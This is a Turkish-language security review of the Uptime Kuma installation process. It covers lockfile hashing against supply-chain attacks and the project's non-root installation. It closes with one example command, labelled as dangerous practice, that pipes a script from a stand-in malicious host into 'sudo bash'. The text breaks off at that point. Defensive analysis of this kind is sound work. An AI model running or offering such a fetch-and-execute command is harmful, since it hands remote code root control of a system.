# 🔍 Adım 1: Kurulum ve install.sh Analizi (Reverse Engineering)

> **Hedef:** Projenin kurulum adımlarının incelenmesi, tedarik zinciri (supply chain) analizi ve yetki/bağımlılık kontrollerinin yapılması.

Uptime Kuma projesinin resmi dokümantasyonu ve kurulum betikleri incelendiğinde, modern DevOps ve güvenli kurulum standartlarının benimsendiği görülmektedir. Güvenlik zafiyetlerine davetiye çıkaran ve literatürde anti-patern olarak bilinen *körlemesine script çalıştırma* tekniği bu projede kullanılmamaktadır.

### 🛡️ Temel Güvenlik Bulguları

#### 1. Tedarik Zinciri Güvenliği (Supply Chain Security)
Projenin temel bağımlılıkları `package.json` üzerinden yönetilmektedir. Sistemin güvenliği açısından en kritik bileşen olan `package-lock.json` dosyası projede mevcuttur.
* **Mekanizma:** Bu dosya, projeye dışarıdan dahil edilen alt kütüphanelerin tam sürüm numaralarını ve kriptografik hash değerlerini (SHA-512) kilitler.
* **Güvenlik Etkisi:** Olası bir **Dependency Confusion** veya **Typosquatting** saldırısında (NPM repolarına zararlı kod sızdırılması), kurulum esnasında hash değerleri uyuşmayacağı için süreç `npm` tarafından otomatik olarak durdurulur. 

#### 2. En Az Yetki Prensibi (Principle of Least Privilege)
Manuel Node.js kurulumlarında sistem geneline etki edecek `root` veya `sudo` yetkisine ihtiyaç duyulmamaktadır.
* **Analiz:** Kurulum işlemleri tamamen süreci başlatan kullanıcının kendi alanında (userspace) gerçekleşmektedir. Bu durum, sisteme olası bir zararlı paket (malware) sızması durumunda dahi, zararlının sistemi tamamen ele geçirmesini (Privilege Escalation) zorlaştırır.

#### 3. Güvenli Olmayan Pratiklerden Kaçınma
Aşağıdaki gibi dışarıdan doğrulanamayan shell betiklerinin root yetkisiyle çalıştırılmasına projede **rastlanmamıştır**:
```bash
# UPTIME KUMA'DA BULUNMAYAN TEHLİKELİ KULLANIM
curl -sL [https://malicious-source.com/install.sh](https://malicious-source.com/install.sh) | sudo bash
